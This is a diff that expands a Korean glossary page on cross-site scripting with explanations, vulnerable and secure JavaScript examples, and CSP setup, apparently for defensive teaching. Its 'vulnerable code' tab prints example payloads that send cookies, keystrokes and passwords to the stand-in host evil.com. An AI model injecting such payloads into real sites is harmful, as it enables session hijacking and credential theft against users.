@@ -4,15 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>XSS (Cross-Site Scripting) | KAITRUST AI 백과사전</title>
-    <meta name="description" content="악성 스크립트 삽입 공격. 입력 검증으로 방어. OWASP Top 10.">
-    <meta name="keywords" content="XSS, Cross-Site Scripting, AI 용어, KAITRUST, AI 백과사전, 보안">
+    <meta name="description" content="XSS는 웹 애플리케이션에 악성 스크립트를 삽입하여 사용자 브라우저에서 실행시키는 공격입니다. 쿠키 탈취, 세션 하이재킹, 피싱 등에 악용되며 OWASP Top 10에 포함됩니다.">
+    <meta name="keywords" content="XSS, Cross-Site Scripting, 크로스사이트 스크립팅, Reflected XSS, Stored XSS, DOM XSS, 스크립트 삽입, 웹 보안, OWASP, 입력 검증, 출력 인코딩, CSP, AI 용어, KAITRUST">
     <link rel="canonical" href="https://glossary.kaitrust.ai/ko/term/XSS/">
 
     <!-- Open Graph -->
     <meta property="og:type" content="article">
     <meta property="og:url" content="https://glossary.kaitrust.ai/ko/term/XSS/">
     <meta property="og:title" content="XSS (Cross-Site Scripting) | KAITRUST AI 백과사전">
-    <meta property="og:description" content="악성 스크립트 삽입 공격. 입력 검증으로 방어. OWASP Top 10.">
+    <meta property="og:description" content="XSS는 웹 애플리케이션에 악성 스크립트를 삽입하여 사용자 브라우저에서 실행시키는 공격입니다.">
     <meta property="og:image" content="https://kaitrust.ai/images/og-glossary.png">
     <meta property="og:locale" content="ko_KR">
     <meta property="og:site_name" content="KAITRUST AI 백과사전">
@@ -20,7 +20,7 @@
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="XSS (Cross-Site Scripting) | KAITRUST AI 백과사전">
-    <meta name="twitter:description" content="악성 스크립트 삽입 공격. 입력 검증으로 방어. OWASP Top 10.">
+    <meta name="twitter:description" content="XSS는 웹 애플리케이션에 악성 스크립트를 삽입하여 사용자 브라우저에서 실행시키는 공격입니다.">
     <meta name="twitter:image" content="https://kaitrust.ai/images/og-glossary.png">
 
     <!-- Structured Data (JSON-LD) -->
@@ -29,7 +29,8 @@
         "@context": "https://schema.org",
         "@type": "DefinedTerm",
         "name": "XSS",
-        "description": "악성 스크립트 삽입 공격. 입력 검증으로 방어. OWASP Top 10.",
+        "alternateName": "Cross-Site Scripting",
+        "description": "XSS는 웹 애플리케이션에 악성 스크립트를 삽입하여 사용자 브라우저에서 실행시키는 공격입니다.",
         "inDefinedTermSet": {
             "@type": "DefinedTermSet",
             "name": "KAITRUST AI 백과사전",
@@ -52,164 +53,426 @@
     <link rel="stylesheet" href="/components/ask-ai/kaitrust-ai-modal.css">
 
     <style>
-        .term-detail-container {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 120px 2rem 4rem;
-            position: relative;
-            z-index: 1;
-        }
-        .breadcrumb {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            margin-bottom: 2rem;
-            font-size: 0.9rem;
-            flex-wrap: wrap;
-        }
-        .breadcrumb a {
-            color: #64748b;
-            text-decoration: none;
-            transition: color 0.2s;
-        }
+        .term-section { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(168, 85, 247, 0.1); border-radius: 16px; padding: 2rem; margin-bottom: 1.5rem; }
+        .section-title { font-size: 1.4rem; font-weight: 600; color: #f1f5f9; margin-bottom: 1.5rem; padding-bottom: 0.75rem; border-bottom: 1px solid rgba(168, 85, 247, 0.2); }
+        .section-content p { color: #cbd5e1; line-height: 1.8; margin-bottom: 1rem; }
+        .section-content p:last-child { margin-bottom: 0; }
+
+        .code-tabs { display: flex; gap: 0.5rem; margin-bottom: 1rem; flex-wrap: wrap; }
+        .code-tab { padding: 0.5rem 1rem; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; color: #94a3b8; cursor: pointer; transition: all 0.2s; }
+        .code-tab.active { background: rgba(168, 85, 247, 0.2); border-color: #a855f7; color: #a855f7; }
+        .code-block { position: relative; background: #0f172a; border-radius: 12px; overflow: hidden; display: none; }
+        .code-block.active { display: block; }
+        .code-block pre { padding: 1.5rem; margin: 0; overflow-x: auto; }
+        .code-block code { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: #e2e8f0; line-height: 1.6; }
+        .copy-btn { position: absolute; top: 0.75rem; right: 0.75rem; padding: 0.5rem 1rem; background: rgba(168, 85, 247, 0.3); border: none; border-radius: 6px; color: #e2e8f0; cursor: pointer; font-size: 0.85rem; transition: all 0.2s; }
+        .copy-btn:hover { background: rgba(168, 85, 247, 0.5); }
+
+        .conversation-examples { display: flex; flex-direction: column; gap: 1.5rem; }
+        .conv-item { background: rgba(0, 0, 0, 0.2); border-radius: 12px; padding: 1.25rem; }
+        .conv-context { font-size: 0.9rem; color: #a855f7; font-weight: 500; margin-bottom: 0.75rem; }
+        .conv-quote { color: #e2e8f0; font-style: italic; line-height: 1.7; margin: 0; padding-left: 1rem; border-left: 3px solid #a855f7; }
+
+        .warning-list { display: flex; flex-direction: column; gap: 1rem; }
+        .warning-item { display: flex; gap: 1rem; padding: 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 10px; }
+        .warning-icon { font-size: 1.5rem; }
+        .warning-item strong { color: #f1f5f9; display: block; margin-bottom: 0.25rem; }
+        .warning-item p { color: #94a3b8; margin: 0; font-size: 0.95rem; }
+
+        .related-terms { display: flex; flex-wrap: wrap; gap: 0.75rem; }
+        .related-term-link { padding: 0.5rem 1rem; background: rgba(168, 85, 247, 0.1); border: 1px solid rgba(168, 85, 247, 0.3); border-radius: 20px; color: #a855f7; text-decoration: none; font-size: 0.9rem; transition: all 0.2s; }
+        .related-term-link:hover { background: rgba(168, 85, 247, 0.2); transform: translateY(-2px); }
+
+        .learn-more { display: flex; flex-direction: column; gap: 0.75rem; }
+        .learn-link { display: flex; align-items: center; gap: 0.75rem; padding: 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 10px; color: #00f5ff; text-decoration: none; transition: all 0.2s; }
+        .learn-link:hover { background: rgba(0, 0, 0, 0.3); transform: translateX(5px); }
+
+        .term-detail-container { max-width: 900px; margin: 0 auto; padding: 120px 2rem 4rem; position: relative; z-index: 1; }
+        .breadcrumb { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 2rem; font-size: 0.9rem; flex-wrap: wrap; }
+        .breadcrumb a { color: #64748b; text-decoration: none; transition: color 0.2s; }
         .breadcrumb a:hover { color: var(--primary); }
         .breadcrumb span { color: #64748b; }
         .breadcrumb .current { color: var(--accent); font-weight: 500; }
-        .term-detail-header {
-            background: linear-gradient(145deg, rgba(15, 23, 42, 0.9), rgba(30, 41, 59, 0.6));
-            border: 1px solid rgba(168, 85, 247, 0.2);
-            border-radius: 24px;
-            padding: 3rem;
-            margin-bottom: 2rem;
-            position: relative;
-            overflow: hidden;
-        }
-        .term-category-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            padding: 0.5rem 1rem;
-            background: rgba(168, 85, 247, 0.2);
-            border-radius: 20px;
-            font-size: 0.85rem;
-            color: #a855f7;
-            margin-bottom: 1rem;
-        }
-        .term-title {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 2.5rem;
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-            background: linear-gradient(135deg, #ffffff, #a855f7);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        .term-english {
-            font-size: 1.2rem;
-            color: #94a3b8;
-            margin-bottom: 1.5rem;
-        }
-        .term-description {
-            font-size: 1.1rem;
-            line-height: 1.8;
-            color: #e2e8f0;
-        }
-        .term-actions {
-            display: flex;
-            gap: 1rem;
-            margin-top: 2rem;
-            flex-wrap: wrap;
-        }
-        .term-action-btn {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            padding: 0.75rem 1.5rem;
-            border-radius: 12px;
-            font-size: 0.9rem;
-            text-decoration: none;
-            transition: all 0.3s;
-        }
-        .btn-primary {
-            background: linear-gradient(135deg, #a855f7, #6366f1);
-            color: white;
-        }
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(168, 85, 247, 0.3);
-        }
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.1);
-            color: #e2e8f0;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
-        .related-section {
-            margin-top: 3rem;
-        }
-        .related-title {
-            font-size: 1.3rem;
-            font-weight: 600;
-            margin-bottom: 1.5rem;
-            color: #f1f5f9;
-        }
-        @media (max-width: 768px) {
-            .term-detail-container { padding: 100px 1rem 2rem; }
-            .term-detail-header { padding: 2rem 1.5rem; }
-            .term-title { font-size: 1.8rem; }
-        }
+        .term-detail-header { background: linear-gradient(145deg, rgba(15, 23, 42, 0.9), rgba(30, 41, 59, 0.6)); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 24px; padding: 3rem; margin-bottom: 2rem; position: relative; overflow: hidden; }
+        .term-category-badge { display: inline-flex; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem; background: rgba(168, 85, 247, 0.2); border-radius: 20px; font-size: 0.85rem; color: #a855f7; margin-bottom: 1rem; }
+        .term-title { font-family: 'Orbitron', sans-serif; font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; background: linear-gradient(135deg, #ffffff, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .term-english { font-size: 1.2rem; color: #94a3b8; margin-bottom: 1.5rem; }
+        .term-description { font-size: 1.1rem; line-height: 1.8; color: #e2e8f0; }
+        .term-actions { display: flex; gap: 1rem; margin-top: 2rem; flex-wrap: wrap; }
+        .term-action-btn { display: inline-flex; align-items: center; gap: 0.5rem; padding: 0.75rem 1.5rem; border-radius: 12px; font-size: 0.9rem; text-decoration: none; transition: all 0.3s; }
+        .btn-primary { background: linear-gradient(135deg, #a855f7, #6366f1); color: white; }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(168, 85, 247, 0.3); }
+        .btn-secondary { background: rgba(255, 255, 255, 0.1); color: #e2e8f0; border: 1px solid rgba(255, 255, 255, 0.2); }
+        .btn-secondary:hover { background: rgba(255, 255, 255, 0.2); }
+        @media (max-width: 768px) { .term-detail-container { padding: 100px 1rem 2rem; } .term-detail-header { padding: 2rem 1.5rem; } .term-title { font-size: 1.8rem; } }
     </style>
 </head>
 <body>
-    <!-- Particle Background -->
     <div class="particle-container" id="particles"></div>
 
-    <!-- Header -->
     <div id="kaitrust-header"></div>
 
     <main class="term-detail-container">
-        <!-- Breadcrumb -->
         <nav class="breadcrumb" aria-label="Breadcrumb">
-            <a href="https://kaitrust.ai">홈</a>
-            <span>›</span>
-            <a href="https://glossary.kaitrust.ai">AI 백과사전</a>
-            <span>›</span>
-            <a href="https://glossary.kaitrust.ai/#security">보안</a>
-            <span>›</span>
+            <a href="https://kaitrust.ai">홈</a><span>›</span>
+            <a href="https://glossary.kaitrust.ai">AI 백과사전</a><span>›</span>
+            <a href="https://glossary.kaitrust.ai/#security">보안</a><span>›</span>
             <span class="current">XSS</span>
         </nav>
 
-        <!-- Term Header -->
         <article class="term-detail-header">
-            <div class="term-category-badge">
-                <span>🔒</span>
-                <span>보안</span>
-            </div>
+            <div class="term-category-badge"><span>🔒</span><span>보안</span></div>
             <h1 class="term-title">XSS</h1>
             <p class="term-english">Cross-Site Scripting</p>
             <div class="term-description">
-                <p>악성 스크립트 삽입 공격. 입력 검증으로 방어. OWASP Top 10.</p>
+                <p>웹 애플리케이션에 악성 스크립트를 삽입하여 사용자 브라우저에서 실행시키는 공격입니다. 쿠키 탈취, 세션 하이재킹, 피싱 등에 악용되며 OWASP Top 10에 포함됩니다.</p>
             </div>
             <div class="term-actions">
-                <a href="https://glossary.kaitrust.ai" class="term-action-btn btn-primary">
-                    📚 전체 용어 보기
-                </a>
-                <a href="https://glossary.kaitrust.ai/#security" class="term-action-btn btn-secondary">
-                    🔒 보안 더보기
-                </a>
+                <a href="https://glossary.kaitrust.ai" class="term-action-btn btn-primary">📚 전체 용어 보기</a>
+                <a href="https://glossary.kaitrust.ai/#security" class="term-action-btn btn-secondary">🔒 보안 더보기</a>
             </div>
         </article>
+
+        <section class="term-section">
+            <h2 class="section-title">📖 상세 설명</h2>
+            <div class="section-content">
+                <p>XSS(Cross-Site Scripting)는 공격자가 웹 페이지에 악성 스크립트를 주입하여, 해당 페이지를 방문하는 다른 사용자의 브라우저에서 실행시키는 공격 기법입니다. "스크립트 주입 공격"이라고도 불리며, 웹 애플리케이션이 사용자 입력을 제대로 검증하지 않을 때 발생합니다. 공격에 성공하면 사용자의 쿠키, 세션 토큰, 개인 정보 탈취가 가능합니다.</p>
+                <p>XSS는 세 가지 유형으로 분류됩니다. Reflected XSS(반사형)는 악성 스크립트가 URL 파라미터 등을 통해 서버에 전송되고, 즉시 응답 페이지에 포함되어 반환됩니다. 피싱 이메일의 링크를 통해 많이 활용됩니다. Stored XSS(저장형)는 악성 스크립트가 서버 데이터베이스에 저장되어 해당 페이지를 방문하는 모든 사용자에게 영향을 미칩니다. 게시판 댓글, 프로필 등에서 발생하며 가장 위험합니다. DOM-based XSS는 서버를 거치지 않고 클라이언트 측 JavaScript가 직접 DOM을 조작할 때 발생합니다.</p>
+                <p>XSS 방어의 핵심은 "신뢰할 수 없는 데이터를 안전하게 처리"하는 것입니다. 출력 인코딩(Output Encoding)은 HTML 컨텍스트에서 &lt;, &gt;, &amp; 등을 HTML 엔티티로 변환합니다. CSP(Content Security Policy)는 HTTP 헤더로 스크립트 실행 출처를 제한합니다. HttpOnly 쿠키는 JavaScript에서 쿠키 접근을 차단하여 쿠키 탈취를 방지합니다. 입력 검증(Input Validation)은 허용된 형식만 받아들이지만, 이것만으로는 불충분합니다.</p>
+                <p>프레임워크마다 XSS 방어 기능이 내장되어 있습니다. React는 기본적으로 JSX 내 값을 이스케이프하고, dangerouslySetInnerHTML을 명시적으로 사용해야 raw HTML을 렌더링합니다. Vue.js의 v-html, Angular의 [innerHTML]도 마찬가지입니다. 하지만 URL 속성(href, src)에 javascript: 프로토콜을 넣는 공격은 별도로 방어해야 합니다.</p>
+            </div>
+        </section>
+
+        <section class="term-section">
+            <h2 class="section-title">💻 코드 예제</h2>
+            <div class="code-tabs">
+                <button class="code-tab active" data-lang="vulnerable">취약한 코드</button>
+                <button class="code-tab" data-lang="secure">안전한 코드</button>
+                <button class="code-tab" data-lang="csp">CSP 설정</button>
+            </div>
+            <div class="code-block active" data-lang="vulnerable">
+                <pre><code class="language-javascript">// ❌ XSS 취약한 코드 예시들
+
+// 1. innerHTML에 사용자 입력 직접 삽입
+function displayUserComment(comment) {
+    // 위험: comment에 &lt;script>alert('XSS')&lt;/script> 포함 가능
+    document.getElementById('comments').innerHTML = comment;
+}
+
+// 2. URL 파라미터를 그대로 출력
+// URL: https://example.com/search?q=&lt;script>document.location='https://evil.com/steal?c='+document.cookie&lt;/script>
+const urlParams = new URLSearchParams(window.location.search);
+const searchQuery = urlParams.get('q');
+document.getElementById('result').innerHTML = `검색어: ${searchQuery}`;
+
+// 3. eval() 또는 Function() 사용
+const userInput = "alert('XSS')";
+eval(userInput);  // 절대 금지!
+
+// 4. href에 javascript: 프로토콜 허용
+const userUrl = "javascript:alert('XSS')";
+document.getElementById('link').href = userUrl;
+
+// 5. 템플릿 리터럴로 HTML 생성
+function renderProfile(user) {
+    return `
+        &lt;div class="profile">
+            &lt;h2>${user.name}&lt;/h2>  // 위험!
+            &lt;p>${user.bio}&lt;/p>     // 위험!
+        &lt;/div>
+    `;
+}
+
+// 6. jQuery .html() 메서드
+$('#output').html(userInput);  // 위험!
+
+
+// === XSS 공격 페이로드 예시 ===
+// (교육 목적, 실제 공격에 사용 금지)
+
+// 쿠키 탈취
+// &lt;script>new Image().src='https://evil.com/steal?c='+document.cookie&lt;/script>
+
+// 키로거
+// &lt;script>document.onkeypress=function(e){new Image().src='https://evil.com/log?k='+e.key}&lt;/script>
+
+// 피싱 폼 삽입
+// &lt;div>&lt;form action="https://evil.com/phish">비밀번호:&lt;input name="pw">&lt;/form>&lt;/div></code></pre>
+                <button class="copy-btn" onclick="copyCode(this)">📋 복사</button>
+            </div>
+            <div class="code-block" data-lang="secure">
+                <pre><code class="language-javascript">// ✅ XSS 안전한 코드 예시들
+
+// 1. textContent 사용 (HTML 해석 안 함)
+function displayUserComment(comment) {
+    document.getElementById('comments').textContent = comment;
+    // &lt;script> 태그도 텍스트로 표시됨
+}
+
+// 2. HTML 이스케이프 함수
+function escapeHtml(unsafe) {
+    return unsafe
+        .replace(/&/g, "&amp;amp;")
+        .replace(/&lt;/g, "&amp;lt;")
+        .replace(/>/g, "&amp;gt;")
+        .replace(/"/g, "&amp;quot;")
+        .replace(/'/g, "&amp;#039;");
+}
+
+const safeComment = escapeHtml(userComment);
+element.innerHTML = safeComment;
+
+// 3. DOMPurify 라이브러리 사용 (HTML 허용 필요 시)
+import DOMPurify from 'dompurify';
+
+function displayRichContent(html) {
+    const cleanHtml = DOMPurify.sanitize(html, {
+        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
+        ALLOWED_ATTR: ['href']
+    });
+    document.getElementById('content').innerHTML = cleanHtml;
+}
+
+// 4. URL 검증 (javascript: 프로토콜 차단)
+function isValidUrl(url) {
+    try {
+        const parsed = new URL(url);
+        return ['http:', 'https:'].includes(parsed.protocol);
+    } catch {
+        return false;
+    }
+}
+
+function setLink(url) {
+    if (isValidUrl(url)) {
+        document.getElementById('link').href = url;
+    } else {
+        console.error('Invalid URL');
+    }
+}
+
+// 5. React에서 안전하게 처리
+function Comment({ text }) {
+    // 기본적으로 이스케이프됨
+    return &lt;p>{text}&lt;/p>;
+}
+
+// HTML 렌더링 필요 시 DOMPurify 사용
+function RichComment({ html }) {
+    const cleanHtml = DOMPurify.sanitize(html);
+    return &lt;div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
+}
+
+// 6. 서버 사이드 (Node.js Express)
+const express = require('express');
+const xss = require('xss');
+
+app.post('/comment', (req, res) => {
+    // 입력 살균
+    const cleanComment = xss(req.body.comment);
+    // 저장...
+});
+
+// 7. 템플릿 엔진 자동 이스케이프 (EJS)
+// &lt;%= user.name %>  자동 이스케이프
+// &lt;%- user.name %>  이스케이프 안 함 (위험!)</code></pre>
+                <button class="copy-btn" onclick="copyCode(this)">📋 복사</button>
+            </div>
+            <div class="code-block" data-lang="csp">
+                <pre><code class="language-text">CSP (Content Security Policy) 설정
+====================================
+
+# HTTP 헤더로 설정
+Content-Security-Policy: default-src 'self';
+                         script-src 'self' https://trusted-cdn.com;
+                         style-src 'self' 'unsafe-inline';
+                         img-src 'self' data: https:;
+                         font-src 'self' https://fonts.gstatic.com;
+                         connect-src 'self' https://api.example.com;
+                         frame-ancestors 'none';
+                         base-uri 'self';
+                         form-action 'self';
+
+# HTML meta 태그로 설정
+&lt;meta http-equiv="Content-Security-Policy"
+      content="default-src 'self'; script-src 'self'">
+
+
+=== CSP 지시문 설명 ===
+
+default-src 'self'
+    기본: 같은 출처에서만 로드
+
+script-src 'self' https://cdn.example.com
+    스크립트: 자체 + 특정 CDN만 허용
+
+script-src 'self' 'nonce-abc123'
+    인라인 스크립트: nonce 일치 시만 실행
+    &lt;script nonce="abc123">...&lt;/script>
+
+script-src 'self' 'sha256-hash...'
+    특정 해시값의 스크립트만 허용
+
+style-src 'self' 'unsafe-inline'
+    인라인 스타일 허용 (XSS 위험 낮음)
+
+img-src * data:
+    이미지: 모든 출처 + data URI 허용
+
+connect-src 'self'
+    AJAX/WebSocket: 같은 출처만
+
+frame-ancestors 'none'
+    iframe 삽입 금지 (클릭재킹 방어)
+
+upgrade-insecure-requests
+    HTTP를 HTTPS로 자동 업그레이드
+
+
+=== Node.js Express 설정 ===
+
+const helmet = require('helmet');
+
+app.use(helmet.contentSecurityPolicy({
+    directives: {
+        defaultSrc: ["'self'"],
+        scriptSrc: ["'self'", "https://cdn.example.com"],
+        styleSrc: ["'self'", "'unsafe-inline'"],
+        imgSrc: ["'self'", "data:", "https:"],
+        connectSrc: ["'self'", "https://api.example.com"],
+        frameAncestors: ["'none'"],
+        baseUri: ["'self'"],
+        formAction: ["'self'"]
+    }
+}));
+
+// 동적 nonce 생성
+app.use((req, res, next) => {
+    res.locals.nonce = crypto.randomBytes(16).toString('base64');
+    next();
+});
+
+
+=== 보고 전용 모드 (테스트용) ===
+
+Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
+
+// 위반 시 report-uri로 JSON 리포트 전송
+// 정책 위반해도 차단하지 않음 (테스트용)</code></pre>
+                <button class="copy-btn" onclick="copyCode(this)">📋 복사</button>
+            </div>
+        </section>
+
+        <section class="term-section">
+            <h2 class="section-title">🗣️ 실무에서 이렇게 말하세요</h2>
+            <div class="conversation-examples">
+                <div class="conv-item">
+                    <div class="conv-context">💬 코드 리뷰에서</div>
+                    <blockquote class="conv-quote">
+                        "이 부분에서 innerHTML에 사용자 입력을 직접 넣고 있네요. Stored XSS 취약점입니다. textContent로 바꾸거나, HTML이 필요하면 DOMPurify로 살균 후 삽입해주세요. 그리고 CSP 헤더도 추가해서 인라인 스크립트 실행을 차단합시다."
+                    </blockquote>
+                </div>
+                <div class="conv-item">
+                    <div class="conv-context">💬 보안 점검 회의에서</div>
+                    <blockquote class="conv-quote">
+                        "이번 릴리스에서 XSS 취약점 3건이 발견됐습니다. 댓글 기능에서 Stored XSS, 검색 기능에서 Reflected XSS가 있었어요. 모든 출력 지점에서 컨텍스트에 맞는 인코딩을 적용하고, CSP를 strict하게 설정하겠습니다."
+                    </blockquote>
+                </div>
+                <div class="conv-item">
+                    <div class="conv-context">💬 면접에서</div>
+                    <blockquote class="conv-quote">
+                        "XSS 방어는 출력 인코딩이 핵심입니다. HTML 컨텍스트에서는 &lt;, &gt;를 엔티티로, JavaScript 컨텍스트에서는 JSON.stringify, URL 컨텍스트에서는 encodeURIComponent를 사용합니다. 그리고 CSP로 인라인 스크립트를 차단하면 설령 XSS가 있어도 실행이 어렵습니다."
+                    </blockquote>
+                </div>
+            </div>
+        </section>
+
+        <section class="term-section">
+            <h2 class="section-title">⚠️ 주의사항 & 베스트 프랙티스</h2>
+            <div class="warning-list">
+                <div class="warning-item">
+                    <span class="warning-icon">❌</span>
+                    <div>
+                        <strong>innerHTML에 사용자 입력 직접 삽입</strong>
+                        <p>element.innerHTML = userInput은 XSS의 가장 흔한 원인입니다. textContent를 사용하거나, HTML 필요 시 DOMPurify로 살균하세요.</p>
+                    </div>
+                </div>
+                <div class="warning-item">
+                    <span class="warning-icon">❌</span>
+                    <div>
+                        <strong>입력 검증만으로 방어</strong>
+                        <p>입력 검증(블랙리스트)만으로는 XSS를 완전히 막을 수 없습니다. 다양한 우회 기법이 존재합니다. 출력 인코딩이 필수입니다.</p>
+                    </div>
+                </div>
+                <div class="warning-item">
+                    <span class="warning-icon">❌</span>
+                    <div>
+                        <strong>eval(), Function(), setTimeout(string)</strong>
+                        <p>문자열을 코드로 실행하는 함수는 XSS 공격 벡터입니다. 사용자 입력이 포함될 가능성이 있다면 절대 사용하지 마세요.</p>
+                    </div>
+                </div>
+                <div class="warning-item">
+                    <span class="warning-icon">✅</span>
+                    <div>
+                        <strong>XSS 방어 베스트 프랙티스</strong>
+                        <p>컨텍스트별 출력 인코딩, CSP 헤더 적용, HttpOnly 쿠키, 프레임워크 자동 이스케이프 활용, DOMPurify로 HTML 살균, 정기적 보안 스캔.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="term-section">
+            <h2 class="section-title">🔗 관련 용어</h2>
+            <div class="related-terms">
+                <a href="/ko/term/CSRF/" class="related-term-link">CSRF</a>
+                <a href="/ko/term/SQL%20Injection/" class="related-term-link">SQL Injection</a>
+                <a href="/ko/term/Authentication/" class="related-term-link">Authentication</a>
+                <a href="/ko/term/JWT/" class="related-term-link">JWT</a>
+                <a href="/ko/term/Firewall/" class="related-term-link">Firewall (WAF)</a>
+            </div>
+        </section>
+
+        <section class="term-section">
+            <h2 class="section-title">📚 더 배우기</h2>
+            <div class="learn-more">
+                <a href="https://owasp.org/www-community/attacks/xss/" target="_blank" class="learn-link">
+                    📄 OWASP - XSS 공격 설명
+                </a>
+                <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" class="learn-link">
+                    🎓 OWASP XSS 방어 치트시트
+                </a>
+                <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" class="learn-link">
+                    📖 MDN - Content Security Policy 가이드
+                </a>
+            </div>
+        </section>
     </main>
 
-    <!-- Footer -->
     <div id="kaitrust-footer"></div>
 
-    <!-- Scripts -->
     <script>document.getElementById('currentYear').textContent = new Date().getFullYear();</script>
-    <script>window.WIA_A11Y_CONFIG = { fabBottom: "38px", fabRight: "30px" };</script>
+    <script>
+    function copyCode(btn) {
+        const codeBlock = btn.parentElement.querySelector('code');
+        navigator.clipboard.writeText(codeBlock.textContent).then(() => {
+            btn.textContent = '✅ 복사됨!';
+            setTimeout(() => btn.textContent = '📋 복사', 2000);
+        });
+    }
+    document.querySelectorAll('.code-tab').forEach(tab => {
+        tab.addEventListener('click', function() {
+            const lang = this.dataset.lang;
+            const section = this.closest('.term-section');
+            section.querySelectorAll('.code-tab').forEach(t => t.classList.remove('active'));
+            this.classList.add('active');
+            section.querySelectorAll('.code-block').forEach(block => {
+                block.classList.remove('active');
+                if (block.dataset.lang === lang) block.classList.add('active');
+            });
+        });
+    });
+    </script>
+    <script>window.WIA_A11Y_CONFIG = { fabBottom: "78px", fabRight: "170px" };</script>
     <script src="https://wia.live/wia-a11y-toolkit/wia-a11y-toolkit.min.js"></script>
     <script src="/components/ask-ai/kaitrust-ai-modal.js"></script>
     <script src="https://kaitrust.ai/components/site-kit/kaitrust-site-kit.js"></script>
